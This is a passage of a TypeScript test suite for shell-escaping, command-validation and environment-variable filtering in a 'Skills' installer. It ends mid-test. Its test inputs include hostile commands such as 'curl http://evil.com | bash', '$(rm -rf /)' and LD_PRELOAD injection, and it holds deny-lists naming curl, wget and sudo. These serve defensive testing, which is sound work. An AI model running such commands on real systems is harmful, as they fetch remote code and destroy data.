/**
 * Skill Services Security Tests
 *
 * Tests for security-critical functionality in the Skills system:
 * - Shell argument escaping (shell-escape.ts)
 * - Command validation (SkillInstaller.validateCommand)
 * - Safe YAML parsing (SkillRegistry)
 * - Environment variable name validation
 */

import * as assert from "assert";
import * as sinon from "sinon";
import * as os from "os";
import {
  escapeShellArg,
  escapeShellArgWindows,
  escapeShellArgPowershell,
  escapeShellArgPlatform,
  escapeShellArgs,
  buildSafeCommand,
  isSafeCommandName,
  isValidEnvVarName,
  buildEnvExports,
} from "../../services/skill/shell-escape";

suite("Shell Escape Utility — Security Tests", () => {
  suite("escapeShellArg (Unix/macOS)", () => {
    test("escapes single quotes correctly", () => {
      assert.strictEqual(escapeShellArg("test'value"), "'test'\\''value'");
    });

    test("wraps simple strings in single quotes", () => {
      assert.strictEqual(escapeShellArg("hello"), "'hello'");
    });

    test("handles empty string", () => {
      assert.strictEqual(escapeShellArg(""), "''");
    });

    test("escapes command substitution attempts", () => {
      const malicious = "$(rm -rf /)";
      const escaped = escapeShellArg(malicious);
      // Should be safely quoted, not executable
      assert.ok(escaped.startsWith("'"));
      assert.ok(escaped.endsWith("'"));
      assert.ok(!escaped.includes("$("));
    });

    test("escapes backtick command substitution", () => {
      const malicious = "`rm -rf /`";
      const escaped = escapeShellArg(malicious);
      assert.ok(escaped.startsWith("'"));
    });

    test("handles newlines safely", () => {
      const withNewline = "line1\nline2";
      const escaped = escapeShellArg(withNewline);
      assert.ok(escaped.startsWith("'"));
    });

    test("handles special shell characters", () => {
      const special = "test;whoami|cat /etc/passwd";
      const escaped = escapeShellArg(special);
      assert.ok(escaped.startsWith("'"));
      assert.ok(escaped.endsWith("'"));
    });

    test("escapes glob patterns", () => {
      const glob = "*.txt";
      const escaped = escapeShellArg(glob);
      assert.strictEqual(escaped, "'*.txt'");
    });

    test("handles environment variable injection", () => {
      const envInjection = "$HOME";
      const escaped = escapeShellArg(envInjection);
      assert.ok(escaped.startsWith("'"));
    });
  });

  suite("escapeShellArgWindows", () => {
    test("wraps in double quotes", () => {
      assert.strictEqual(escapeShellArgWindows("test"), '"test"');
    });

    test("escapes internal double quotes", () => {
      assert.strictEqual(escapeShellArgWindows('test"value'), '"test\\"value"');
    });

    test("handles empty string", () => {
      assert.strictEqual(escapeShellArgWindows(""), '""');
    });

    test("handles backslashes before quotes", () => {
      const input = 'path\\to\\"file';
      const escaped = escapeShellArgWindows(input);
      assert.ok(escaped.startsWith('"'));
      assert.ok(escaped.endsWith('"'));
    });
  });

  suite("escapeShellArgPlatform", () => {
    test("uses correct escaping based on platform", () => {
      const result = escapeShellArgPlatform("test");
      if (os.platform() === "win32") {
        assert.strictEqual(result, '"test"');
      } else {
        assert.strictEqual(result, "'test'");
      }
    });
  });

  suite("escapeShellArgs (multiple arguments)", () => {
    test("escapes array of arguments", () => {
      const args = ["arg1", "arg with space", "arg'quote"];
      const escaped = escapeShellArgs(args);
      assert.strictEqual(escaped.length, 3);
      assert.ok(escaped[0].includes("arg1"));
      assert.ok(escaped[1].includes("arg with space"));
    });

    test("handles empty array", () => {
      const escaped = escapeShellArgs([]);
      assert.strictEqual(escaped.length, 0);
    });
  });

  suite("buildSafeCommand", () => {
    test("builds command with escaped arguments", () => {
      const cmd = buildSafeCommand("echo", ["hello", "world"]);
      assert.ok(cmd.startsWith("echo "));
    });

    test("handles arguments with special characters", () => {
      const cmd = buildSafeCommand("echo", ["hello; rm -rf /"]);
      // The malicious part should be safely escaped
      assert.ok(cmd.includes("'"));
    });
  });
});

suite("Shell Escape Utility — Command Validation", () => {
  suite("isSafeCommandName", () => {
    test("allows simple command names", () => {
      assert.strictEqual(isSafeCommandName("npm"), true);
      assert.strictEqual(isSafeCommandName("pip"), true);
      assert.strictEqual(isSafeCommandName("python3"), true);
    });

    test("rejects commands with path separators", () => {
      assert.strictEqual(isSafeCommandName("/usr/bin/bash"), false);
      assert.strictEqual(isSafeCommandName("../evil"), false);
      assert.strictEqual(isSafeCommandName("./script.sh"), false);
    });

    test("rejects commands with shell metacharacters", () => {
      assert.strictEqual(isSafeCommandName("npm;whoami"), false);
      assert.strictEqual(isSafeCommandName("npm|cat"), false);
      assert.strictEqual(isSafeCommandName("npm&bg"), false);
    });

    test("rejects commands with backticks", () => {
      assert.strictEqual(isSafeCommandName("`whoami`"), false);
    });

    test("rejects commands with command substitution", () => {
      assert.strictEqual(isSafeCommandName("$(whoami)"), false);
    });

    test("rejects empty command", () => {
      assert.strictEqual(isSafeCommandName(""), false);
    });

    test("rejects whitespace-only command", () => {
      assert.strictEqual(isSafeCommandName("   "), false);
    });

    test("allows hyphenated commands", () => {
      assert.strictEqual(isSafeCommandName("brew-cask"), true);
    });

    test("allows underscored commands", () => {
      assert.strictEqual(isSafeCommandName("my_script"), true);
    });
  });

  suite("isValidEnvVarName", () => {
    test("allows valid env var names", () => {
      assert.strictEqual(isValidEnvVarName("PATH"), true);
      assert.strictEqual(isValidEnvVarName("MY_VAR"), true);
      assert.strictEqual(isValidEnvVarName("_PRIVATE"), true);
      assert.strictEqual(isValidEnvVarName("VAR123"), true);
    });

    test("rejects names starting with numbers", () => {
      assert.strictEqual(isValidEnvVarName("123VAR"), false);
    });

    test("rejects names with special characters", () => {
      assert.strictEqual(isValidEnvVarName("MY-VAR"), false);
      assert.strictEqual(isValidEnvVarName("MY.VAR"), false);
      assert.strictEqual(isValidEnvVarName("MY VAR"), false);
    });

    test("rejects empty names", () => {
      assert.strictEqual(isValidEnvVarName(""), false);
    });

    test("rejects names with shell metacharacters", () => {
      assert.strictEqual(isValidEnvVarName("VAR;whoami"), false);
      assert.strictEqual(isValidEnvVarName("VAR$(cmd)"), false);
    });
  });

  suite("buildEnvExports", () => {
    test("builds export statements for valid env vars", () => {
      const env = { API_KEY: "secret123", DEBUG: "true" };
      const exports = buildEnvExports(env);
      assert.ok(exports.includes("export API_KEY="));
      assert.ok(exports.includes("export DEBUG="));
    });

    test("escapes values with special characters", () => {
      const env = { VALUE: "test'value" };
      const exports = buildEnvExports(env);
      // Value should be escaped
      assert.ok(exports.includes("'"));
    });

    test("filters out invalid env var names", () => {
      const env = { VALID_VAR: "ok", "123INVALID": "bad", "VAR;CMD": "bad" };
      const exports = buildEnvExports(env);
      assert.ok(exports.includes("VALID_VAR"));
      assert.ok(!exports.includes("123INVALID"));
      assert.ok(!exports.includes("VAR;CMD"));
    });

    test("handles empty env object", () => {
      const exports = buildEnvExports({});
      assert.strictEqual(exports, "");
    });

    test("prevents command injection via env var values", () => {
      const env = { MALICIOUS: "$(whoami)" };
      const exports = buildEnvExports(env);
      // The value should be escaped, not executable
      assert.ok(exports.includes("'$(whoami)'") || exports.includes("'\\$(whoami)'"));
    });
  });
});

suite("Skill System — Command Injection Prevention", () => {
  // These tests verify the command validation patterns used in SkillInstaller
  
  const DANGEROUS_PATTERNS = [
    // Path traversal
    "../",
    "..\\",
    // Dangerous commands
    "rm -rf",
    "rm -fr",
    "rmdir /s",
    "del /f",
    "format",
    // Shell injection
    "eval ",
    "exec ",
    "; ",
    "&& ",
    "|| ",
    "| ",
    // Command substitution
    "$()",
    "`",
    // Environment manipulation
    "export ",
    "set ",
    // Network/download commands (without context)
    "curl ",
    "wget ",
    "powershell",
    "cmd.exe",
  ];

  const FORBIDDEN_PATTERNS = [
    "sudo",
    "su -",
    "chmod 777",
    "chown root",
  ];

  /**
   * Simple command validation matching SkillInstaller logic
   */
  function validateCommand(command: string): { valid: boolean; reason?: string } {
    const lowerCmd = command.toLowerCase();

    for (const pattern of FORBIDDEN_PATTERNS) {
      if (lowerCmd.includes(pattern)) {
        return { valid: false, reason: `Forbidden pattern: ${pattern}` };
      }
    }

    let dangerousCount = 0;
    for (const pattern of DANGEROUS_PATTERNS) {
      if (lowerCmd.includes(pattern.toLowerCase())) {
        dangerousCount++;
      }
    }

    if (dangerousCount >= 2) {
      return { valid: false, reason: "Multiple dangerous patterns detected" };
    }

    return { valid: true };
  }

  test("rejects path traversal attacks", () => {
    const result = validateCommand("cd ../../../etc; cat passwd");
    assert.strictEqual(result.valid, false);
  });

  test("rejects sudo commands", () => {
    const result = validateCommand("sudo rm -rf /");
    assert.strictEqual(result.valid, false);
    assert.ok(result.reason?.includes("Forbidden"));
  });

  test("rejects su commands", () => {
    const result = validateCommand("su - root -c 'rm -rf /'");
    assert.strictEqual(result.valid, false);
  });

  test("rejects chmod 777", () => {
    const result = validateCommand("chmod 777 /etc/passwd");
    assert.strictEqual(result.valid, false);
  });

  test("rejects multiple dangerous patterns", () => {
    // curl + | (pipe) = 2 dangerous patterns
    const result = validateCommand("curl http://evil.com | bash");
    assert.strictEqual(result.valid, false);
  });

  test("allows safe npm commands", () => {
    const result = validateCommand("npm install lodash");
    assert.strictEqual(result.valid, true);
  });

  test("allows safe pip commands", () => {
    const result = validateCommand("pip install requests");
    assert.strictEqual(result.valid, true);
  });

  test("rejects eval-based attacks", () => {
    const result = validateCommand("echo test && eval 'whoami'");
    assert.strictEqual(result.valid, false);
  });

  test("rejects powershell execution", () => {
    const result = validateCommand("powershell -ExecutionPolicy Bypass -File evil.ps1");
    assert.strictEqual(result.valid, false);
  });
});

suite("Skill System — Terminal Name Sanitization", () => {
  /**
   * Simple sanitization matching SkillInstaller logic
   */
  function sanitizeDisplayName(name: string): string {
    return name
      .replace(/[^\w\s-]/g, "") // Remove special characters
      .substring(0, 50) // Limit length
      .trim();
  }

  test("removes special characters", () => {
    const result = sanitizeDisplayName("Test<script>alert(1)</script>");
    assert.strictEqual(result, "Testscriptalert1script");
  });

  test("preserves alphanumeric and spaces", () => {
    const result = sanitizeDisplayName("My Skill Setup");
    assert.strictEqual(result, "My Skill Setup");
  });

  test("preserves hyphens", () => {
    const result = sanitizeDisplayName("my-skill-setup");
    assert.strictEqual(result, "my-skill-setup");
  });

  test("truncates long names", () => {
    const longName = "A".repeat(100);
    const result = sanitizeDisplayName(longName);
    assert.strictEqual(result.length, 50);
  });

  test("handles empty string", () => {
    const result = sanitizeDisplayName("");
    assert.strictEqual(result, "");
  });

  test("removes command injection attempts", () => {
    const result = sanitizeDisplayName("Skill $(whoami)");
    assert.strictEqual(result, "Skill whoami");
  });

  test("removes backtick injection", () => {
    const result = sanitizeDisplayName("Skill `id`");
    assert.strictEqual(result, "Skill id");
  });
});

// ============================================================================
// SKILLS ENHANCEMENT BRANCH TESTS
// ============================================================================

suite("Shell Escape — PowerShell Escaping (Skills Enhancement)", () => {
  suite("escapeShellArgPowershell", () => {
    test("wraps in single quotes", () => {
      assert.strictEqual(escapeShellArgPowershell("test"), "'test'");
    });

    test("escapes single quotes by doubling them", () => {
      assert.strictEqual(escapeShellArgPowershell("it's"), "'it''s'");
    });

    test("handles multiple single quotes", () => {
      assert.strictEqual(escapeShellArgPowershell("it's a 'test'"), "'it''s a ''test'''");
    });

    test("handles empty string", () => {
      assert.strictEqual(escapeShellArgPowershell(""), "''");
    });

    test("handles null", () => {
      assert.strictEqual(escapeShellArgPowershell(null as unknown as string), "''");
    });

    test("handles undefined", () => {
      assert.strictEqual(escapeShellArgPowershell(undefined as unknown as string), "''");
    });

    test("neutralizes command substitution $(...)", () => {
      const malicious = "$(Get-Process)";
      const escaped = escapeShellArgPowershell(malicious);
      // In PowerShell single quotes, $() is literal - not executed
      assert.strictEqual(escaped, "'$(Get-Process)'");
    });

    test("neutralizes variable expansion", () => {
      const malicious = "$env:PATH";
      const escaped = escapeShellArgPowershell(malicious);
      assert.strictEqual(escaped, "'$env:PATH'");
    });

    test("neutralizes backtick escape sequences", () => {
      const malicious = "`n`t";
      const escaped = escapeShellArgPowershell(malicious);
      assert.strictEqual(escaped, "'`n`t'");
    });

    test("handles paths with spaces", () => {
      const path = "C:\\Program Files\\My App\\script.ps1";
      const escaped = escapeShellArgPowershell(path);
      assert.strictEqual(escaped, "'C:\\Program Files\\My App\\script.ps1'");
    });

    test("handles special PowerShell operators", () => {
      const malicious = "; Remove-Item -Recurse -Force C:\\";
      const escaped = escapeShellArgPowershell(malicious);
      assert.ok(escaped.startsWith("'"));
      assert.ok(escaped.endsWith("'"));
    });

    test("handles pipe character", () => {
      const malicious = "test | Out-File evil.txt";
      const escaped = escapeShellArgPowershell(malicious);
      assert.strictEqual(escaped, "'test | Out-File evil.txt'");
    });
  });
});

suite("Skill Installer — Environment Variable Injection Detection (Skills Enhancement)", () => {
  /**
   * Simulates the validateCommand environment injection patterns
   * from SkillInstaller for testing purposes
   */
  const envInjectionPatterns = [
    /LD_PRELOAD/i,
    /LD_LIBRARY_PATH/i,
    /DYLD_INSERT_LIBRARIES/i,
    /DYLD_LIBRARY_PATH/i,
    /\bPATH\s*=/i,
    /\bSHELL\s*=/i,
    /\bHOME\s*=/i,
    /\bUSER\s*=/i,
    /\bLOGNAME\s*=/i,
    /\bTEMP\s*=/i,
    /\bTMPDIR\s*=/i,
    /\bIFS\s*=/i,
  ];

  function detectsEnvInjection(command: string): boolean {
    return envInjectionPatterns.some(pattern => pattern.test(command));
  }

  suite("Linux Dynamic Linker Attacks", () => {
    test("detects LD_PRELOAD injection", () => {
      assert.strictEqual(detectsEnvInjection("LD_PRELOAD=/tmp/evil.so ./app"), true);
    });

    test("detects LD_PRELOAD with export", () => {
      assert.strictEqual(detectsEnvInjection("export LD_PRELOAD=/tmp/evil.so"), true);
    });

    test("detects LD_LIBRARY_PATH injection", () => {
      assert.strictEqual(detectsEnvInjection("LD_LIBRARY_PATH=/tmp ./app"), true);
    });

    test("detects case-insensitive LD_PRELOAD", () => {
      assert.strictEqual(detectsEnvInjection("ld_preload=/tmp/evil.so ./app"), true);
    });
  });

  suite("macOS Dynamic Linker Attacks", () => {
    test("detects DYLD_INSERT_LIBRARIES injection", () => {
      assert.strictEqual(detectsEnvInjection("DYLD_INSERT_LIBRARIES=/tmp/evil.dylib ./app"), true);
    });

    test("detects DYLD_LIBRARY_PATH injection", () => {
      assert.strictEqual(detectsEnvInjection("DYLD_LIBRARY_PATH=/tmp ./app"), true);
    });

    test("detects case-insensitive DYLD attacks", () => {
      assert.strictEqual(detectsEnvInjection("dyld_insert_libraries=/evil.dylib ./app"), true);
    });
  });

  suite("PATH Manipulation Attacks", () => {
    test("detects PATH= assignment", () => {
      assert.strictEqual(detectsEnvInjection("PATH=/tmp:$PATH ./install.sh"), true);
    });

    test("detects PATH prepend", () => {
      assert.strictEqual(detectsEnvInjection("PATH=/malicious/bin:$PATH npm install"), true);
    });

    test("does not false-positive on MYPATH", () => {
      // MYPATH is not PATH - should not match
      assert.strictEqual(detectsEnvInjection("MYPATH=/safe ./app"), false);
    });

    test("does not false-positive on PATH in string", () => {
      // Just mentioning PATH without = should be fine
      assert.strictEqual(detectsEnvInjection("echo PATH is important"), false);
    });
  });

  suite("Shell Environment Attacks", () => {
    test("detects SHELL= assignment", () => {
      assert.strictEqual(detectsEnvInjection("SHELL=/tmp/evil.sh ./app"), true);
    });

    test("detects HOME= assignment", () => {
      assert.strictEqual(detectsEnvInjection("HOME=/tmp/fakehome ./app"), true);
    });

    test("detects USER= assignment", () => {
      assert.strictEqual(detectsEnvInjection("USER=root ./app"), true);
    });

    test("detects LOGNAME= assignment", () => {
      assert.strictEqual(detectsEnvInjection("LOGNAME=root ./app"), true);
    });
  });

  suite("Temp Directory Attacks", () => {
    test("detects TEMP= assignment", () => {
      assert.strictEqual(detectsEnvInjection("TEMP=/controlled/tmp ./installer"), true);
    });

    test("detects TMPDIR= assignment", () => {
      assert.strictEqual(detectsEnvInjection("TMPDIR=/controlled/tmp ./installer"), true);
    });
  });

  suite("IFS Manipulation (Field Separator Attack)", () => {
    test("detects IFS= assignment", () => {
      assert.strictEqual(detectsEnvInjection("IFS=/ ./script.sh"), true);
    });

    test("detects IFS manipulation in compound command", () => {
      assert.strictEqual(detectsEnvInjection("IFS=$'\\n' && ./script.sh"), true);
    });
  });

  suite("Safe Commands (No False Positives)", () => {
    test("allows npm install", () => {
      assert.strictEqual(detectsEnvInjection("npm install lodash"), false);
    });

    test("allows pip install", () => {
      assert.strictEqual(detectsEnvInjection("pip install requests"), false);
    });

    test("allows brew install", () => {
      assert.strictEqual(detectsEnvInjection("brew install jq"), false);
    });

    test("allows apt-get install", () => {
      assert.strictEqual(detectsEnvInjection("apt-get install -y curl"), false);
    });

    test("allows cargo install", () => {
      assert.strictEqual(detectsEnvInjection("cargo install ripgrep"), false);
    });

    test("allows go install", () => {
      assert.strictEqual(detectsEnvInjection("go install github.com/user/tool@latest"), false);
    });
  });
});

suite("Skill Service — Sensitive Environment Variable Blocking (Skills Enhancement)", () => {
  /**
   * Simulates the SENSITIVE_SYSTEM_ENV_VARS set from skill.service.ts
   */
  const SENSITIVE_SYSTEM_ENV_VARS = new Set([
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    "PATH",
    "SHELL",
    "HOME",
    "USER",
    "LOGNAME",
    "PWD",
    "TMPDIR",
    "TEMP",
    "TMP",
    "IFS",
    "EDITOR",
    "VISUAL",
    "PAGER",
    "SSH_AUTH_SOCK",
    "LD_AUDIT",
    "LD_DEBUG",
  ]);

  function isSensitiveEnvVar(name: string): boolean {
    return SENSITIVE_SYSTEM_ENV_VARS.has(name.toUpperCase());
  }

  function filterSensitiveEnvVars(envVars: Record<string, string>): {
    safe: Record<string, string>;
    blocked: string[];
  } {
    const safe: Record<string, string> = {};
    const blocked: string[] = [];

    for (const [key, value] of Object.entries(envVars)) {
      if (isSensitiveEnvVar(key)) {
        blocked.push(key);
      } else {
        safe[key] = value;
      }
    }

    return { safe, blocked };
  }

  suite("Dynamic Linker Variables", () => {
    test("blocks LD_PRELOAD", () => {
      assert.strictEqual(isSensitiveEnvVar("LD_PRELOAD"), true);
    });

    test("blocks LD_LIBRARY_PATH", () => {
      assert.strictEqual(isSensitiveEnvVar("LD_LIBRARY_PATH"), true);
    });

    test("blocks DYLD_INSERT_LIBRARIES", () => {
      assert.strictEqual(isSensitiveEnvVar("DYLD_INSERT_LIBRARIES"), true);
    });

    test("blocks DYLD_LIBRARY_PATH", () => {
      assert.strictEqual(isSensitiveEnvVar("DYLD_LIBRARY_PATH"), true);
    });

    test("blocks LD_AUDIT", () => {
      assert.strictEqual(isSensitiveEnvVar("LD_AUDIT"), true);
    });

    test("blocks LD_DEBUG", () => {
      assert.strictEqual(isSensitiveEnvVar("LD_DEBUG"), true);
    });
  });

  suite("System Path/Shell Variables", () => {
    test("blocks PATH", () => {
      assert.strictEqual(isSensitiveEnvVar("PATH"), true);
    });

    test("blocks SHELL", () => {
      assert.strictEqual(isSensitiveEnvVar("SHELL"), true);
    });

    test("blocks HOME", () => {
      assert.strictEqual(isSensitiveEnvVar("HOME"), true);
    });

    test("blocks PWD", () => {
      assert.strictEqual(isSensitiveEnvVar("PWD"), true);
    });
  });

  suite("User Identity Variables", () => {
    test("blocks USER", () => {
      assert.strictEqual(isSensitiveEnvVar("USER"), true);
    });

    test("blocks LOGNAME", () => {
      assert.strictEqual(isSensitiveEnvVar("LOGNAME"), true);
    });
  });

  suite("Temp Directory Variables", () => {
    test("blocks TMPDIR", () => {
      assert.strictEqual(isSensitiveEnvVar("TMPDIR"), true);
    });

    test("blocks TEMP", () => {
      assert.strictEqual(isSensitiveEnvVar("TEMP"), true);
    });

    test("blocks TMP", () => {
      assert.strictEqual(isSensitiveEnvVar("TMP"), true);
    });
  });

  suite("Editor/Pager Hijacking Variables", () => {
    test("blocks EDITOR", () => {
      assert.strictEqual(isSensitiveEnvVar("EDITOR"), true);
    });

    test("blocks VISUAL", () => {
      assert.strictEqual(isSensitiveEnvVar("VISUAL"), true);
    });

    test("blocks PAGER", () => {
      assert.strictEqual(isSensitiveEnvVar("PAGER"), true);
    });
  });

  suite("SSH Variables", () => {
    test("blocks SSH_AUTH_SOCK", () => {
      assert.strictEqual(isSensitiveEnvVar("SSH_AUTH_SOCK"), true);
    });
  });

  suite("Field Separator", () => {
    test("blocks IFS", () => {
      assert.strictEqual(isSensitiveEnvVar("IFS"), true);
    });
  });

  suite("Case Insensitivity", () => {
    test("blocks lowercase path", () => {
      assert.strictEqual(isSensitiveEnvVar("path"), true);
    });

    test("blocks mixed case LD_Preload", () => {
      assert.strictEqual(isSensitiveEnvVar("LD_Preload"), true);
    });

    test("blocks lowercase shell", () => {
      assert.strictEqual(isSensitiveEnvVar("shell"), true);
    });
  });

  suite("Safe Variables (No False Positives)", () => {
    test("allows JIRA_API_TOKEN", () => {
      assert.strictEqual(isSensitiveEnvVar("JIRA_API_TOKEN"), false);
    });

    test("allows GITHUB_TOKEN", () => {
      assert.strictEqual(isSensitiveEnvVar("GITHUB_TOKEN"), false);
    });

    test("allows DATABASE_URL", () => {
      assert.strictEqual(isSensitiveEnvVar("DATABASE_URL"), false);
    });

    test("allows API_KEY", () => {
      assert.strictEqual(isSensitiveEnvVar("API_KEY"), false);
    });

    test("allows NODE_ENV", () => {
      assert.strictEqual(isSensitiveEnvVar("NODE_ENV"), false);
    });

    test("allows DEBUG", () => {
      assert.strictEqual(isSensitiveEnvVar("DEBUG"), false);
    });

    test("allows MYPATH (not PATH)", () => {
      assert.strictEqual(isSensitiveEnvVar("MYPATH"), false);
    });
  });

  suite("Bulk Filtering", () => {
    test("filters mixed safe and sensitive vars", () => {
      const input = {
        JIRA_API_TOKEN: "secret123",
        PATH: "/malicious/path",
        GITHUB_TOKEN: "ghp_xxx",
        LD_PRELOAD: "/tmp/evil.so",
        DATABASE_URL: "postgres://localhost/db",
        HOME: "/tmp/fakehome",
      };

      const { safe, blocked } = filterSensitiveEnvVars(input);

      // Safe vars should pass through
      assert.strictEqual(safe["JIRA_API_TOKEN"], "secret123");
      assert.strictEqual(safe["GITHUB_TOKEN"], "ghp_xxx");
      assert.strictEqual(safe["DATABASE_URL"], "postgres://localhost/db");

      // Sensitive vars should NOT be in safe
      assert.strictEqual(safe["PATH"], undefined);
      assert.strictEqual(safe["LD_PRELOAD"], undefined);
      assert.strictEqual(safe["HOME"], undefined);

      // Blocked list should contain sensitive vars
      assert.ok(blocked.includes("PATH"));
      assert.ok(blocked.includes("LD_PRELOAD"));
      assert.ok(blocked.includes("HOME"));
      assert.strictEqual(blocked.length, 3);
    });

    test("returns empty blocked array for all safe vars", () => {
      const input = {
        JIRA_API_TOKEN: "secret123",
        GITHUB_TOKEN: "ghp_xxx",
      };

      const { safe, blocked } = filterSensitiveEnvVars(input);

      assert.strictEqual(Object.keys(safe).length, 2);
      assert.strictEqual(blocked.length, 0);
    });

    test("blocks all sensitive vars attempted at once", () => {
      const input = {
        LD_PRELOAD: "/evil.so",
        PATH: "/bad",
        SHELL: "/bin/evil",
        HOME: "/tmp",
        USER: "root",
        IFS: "/",
      };

      const { safe, blocked } = filterSensitiveEnvVars(input);

      assert.strictEqual(Object.keys(safe).length, 0);
      assert.strictEqual(blocked.length, 6);
    });
  });
});

suite("Skill Installer — Dependency Check Caching (Skills Enhancement)", () => {
  /**
   * Simulates the caching behavior from SkillInstaller.checkInstalled
   */
  const CACHE_TTL_MS = 10_000; // 10 seconds

  interface CachedResult {
    result: { installed: boolean; version?: string };
    timestamp: number;
  }

  class MockDependencyCache {
    private cache = new Map<string, CachedResult>();

    isCacheValid(skillName: string, now: number): boolean {
      const cached = this.cache.get(skillName);
      if (!cached) return false;
      return now - cached.timestamp < CACHE_TTL_MS;
    }

    get(skillName: string): CachedResult | undefined {
      return this.cache.get(skillName);
    }

    set(skillName: string, result: { installed: boolean; version?: string }, timestamp: number): void {
      this.cache.set(skillName, { result, timestamp });
    }

    invalidate(skillName: string): void {
      this.cache.delete(skillName);
    }

    clear(): void {
      this.cache.clear();
    }
  }

  let cache: MockDependencyCache;

  setup(() => {
    cache = new MockDependencyCache();
  });

  suite("Cache Validity", () => {
    test("cache is invalid for unknown skill", () => {
      assert.strictEqual(cache.isCacheValid("unknown-skill", Date.now()), false);
    });

    test("cache is valid immediately after setting", () => {
      const now = Date.now();
      cache.set("jira", { installed: true, version: "1.0.0" }, now);
      assert.strictEqual(cache.isCacheValid("jira", now), true);
    });

    test("cache is valid within TTL", () => {
      const setTime = Date.now();
      cache.set("jira", { installed: true }, setTime);
      
      const checkTime = setTime + 5000; // 5 seconds later
      assert.strictEqual(cache.isCacheValid("jira", checkTime), true);
    });

    test("cache is invalid after TTL expires", () => {
      const setTime = Date.now();
      cache.set("jira", { installed: true }, setTime);
      
      const checkTime = setTime + 11000; // 11 seconds later (> 10s TTL)
      assert.strictEqual(cache.isCacheValid("jira", checkTime), false);
    });

    test("cache is invalid exactly at TTL boundary", () => {
      const setTime = Date.now();
      cache.set("jira", { installed: true }, setTime);
      
      const checkTime = setTime + 10000; // Exactly at TTL
      assert.strictEqual(cache.isCacheValid("jira", checkTime), false);
    });
  });

  suite("Cache Operations", () => {
    test("can retrieve cached result", () => {
      const now = Date.now();
      cache.set("gitlab", { installed: true, version: "2.0.0" }, now);
      
      const cached = cache.get("gitlab");
      assert.ok(cached);
      assert.strictEqual(cached.result.installed, true);
      assert.strictEqual(cached.result.version, "2.0.0");
    });

    test("can cache negative results", () => {
      const now = Date.now();
      cache.set("missing-tool", { installed: false }, now);
      
      const cached = cache.get("missing-tool");
      assert.ok(cached);
      assert.strictEqual(cached.result.installed, false);
    });

    test("invalidate removes specific skill cache", () => {
      const now = Date.now();
      cache.set("jira", { installed: true }, now);
      cache.set("gitlab", { installed: true }, now);
      
      cache.invalidate("jira");
      
      assert.strictEqual(cache.get("jira"), undefined);
      assert.ok(cache.get("gitlab")); // gitlab should still be cached
    });

    test("clear removes all cached results", () => {
      const now = Date.now();
      cache.set("jira", { installed: true }, now);
      cache.set("gitlab", { installed: true }, now);
      cache.set("slack", { installed: false }, now);
      
      cache.clear();
      
      assert.strictEqual(cache.get("jira"), undefined);
      assert.strictEqual(cache.get("gitlab"), undefined);
      assert.strictEqual(cache.get("slack"), undefined);
    });
  });

  suite("Cache Behavior Before Installation", () => {
    test("should invalidate cache before install attempt", () => {
      const now = Date.now();
      cache.set("jira", { installed: false }, now);
      
      // Simulate pre-install invalidation
      cache.invalidate("jira");
      
      assert.strictEqual(cache.get("jira"), undefined);
    });
  });
});

suite("SkillConfigField — envVarName Property (Skills Enhancement)", () => {
  interface MockSkillConfigField {
    name: string;
    label: string;
    type: "string" | "secret" | "number" | "boolean" | "select";
    required: boolean;
    envVarName?: string;
  }

  /**
   * Simulates the env var mapping logic from getSkillEnvVars
   */
  function getEnvVarName(field: MockSkillConfigField): string {
    return field.envVarName ?? field.name;
  }

  function shouldIncludeAsEnvVar(field: MockSkillConfigField): boolean {
    return !!field.envVarName || /^[A-Z][A-Z0-9_]*$/.test(field.name);
  }

  suite("envVarName Mapping", () => {
    test("uses envVarName when explicitly set", () => {
      const field: MockSkillConfigField = {
        name: "apiKey",
        label: "API Key",
        type: "secret",
        required: true,
        envVarName: "JIRA_API_TOKEN",
      };

      assert.strictEqual(getEnvVarName(field), "JIRA_API_TOKEN");
    });

    test("falls back to name when envVarName not set", () => {
      const field: MockSkillConfigField = {
        name: "JIRA_API_TOKEN",
        label: "API Token",
        type: "secret",
        required: true,
      };

      assert.strictEqual(getEnvVarName(field), "JIRA_API_TOKEN");
    });

    test("allows friendly field names with envVarName mapping", () => {
      const field: MockSkillConfigField = {
        name: "jiraToken", // Friendly camelCase name
        label: "Jira Token",
        type: "secret",
        required: true,
        envVarName: "JIRA_API_TOKEN", // Actual env var
      };

      // Field shows as "jiraToken" in UI
      assert.strictEqual(field.name, "jiraToken");
      // But maps to JIRA_API_TOKEN for CLI
      assert.strictEqual(getEnvVarName(field), "JIRA_API_TOKEN");
    });
  });

  suite("Inclusion Logic", () => {
    test("includes field with explicit envVarName", () => {
      const field: MockSkillConfigField = {
        name: "apiKey",
        label: "API Key",
        type: "secret",
        required: true,
        envVarName: "MY_API_KEY",
      };

      assert.strictEqual(shouldIncludeAsEnvVar(field), true);
    });

    test("includes field with uppercase underscore name", () => {
      const field: MockSkillConfigField = {
        name: "JIRA_API_TOKEN",
        label: "Token",
        type: "secret",
        required: true,
      };

      assert.strictEqual(shouldIncludeAsEnvVar(field), true);
    });

    test("excludes camelCase field without envVarName", () => {
      const field: MockSkillConfigField = {
        name: "serverUrl",
        label: "Server URL",
        type: "string",
        required: true,
      };

      assert.strictEqual(shouldIncludeAsEnvVar(field), false);
    });

    test("excludes lowercase field without envVarName", () => {
      const field: MockSkillConfigField = {
        name: "debug",
        label: "Debug Mode",
        type: "boolean",
        required: false,
      };

      assert.strictEqual(shouldIncludeAsEnvVar(field), false);
    });
  });

  suite("Multiple Field Scenarios", () => {
    test("processes skill with mixed field types", () => {
      const fields: MockSkillConfigField[] = [
        {
          name: "apiKey",
          label: "API Key",
          type: "secret",
          required: true,
          envVarName: "JIRA_API_TOKEN", // Explicit mapping
        },
        {
          name: "JIRA_URL",
          label: "Jira URL",
          type: "string",
          required: true,
          // No envVarName - uses name directly
        },
        {
          name: "debugMode",
          label: "Debug Mode",
          type: "boolean",
          required: false,
          // No envVarName, not uppercase - excluded from env vars
        },
      ];

      const envVarMapping: Record<string, string> = {};
      const includedFields: string[] = [];

      for (const field of fields) {
        if (shouldIncludeAsEnvVar(field)) {
          includedFields.push(field.name);
          envVarMapping[getEnvVarName(field)] = field.name;
        }
      }

      assert.deepStrictEqual(includedFields, ["apiKey", "JIRA_URL"]);
      assert.strictEqual(envVarMapping["JIRA_API_TOKEN"], "apiKey");
      assert.strictEqual(envVarMapping["JIRA_URL"], "JIRA_URL");
      assert.strictEqual(envVarMapping["debugMode"], undefined);
    });
  });
});

suite("Shell Escape — escapeShellArgs with Shell Type (Skills Enhancement)", () => {
  test("escapeShellArgs returns array not string", () => {
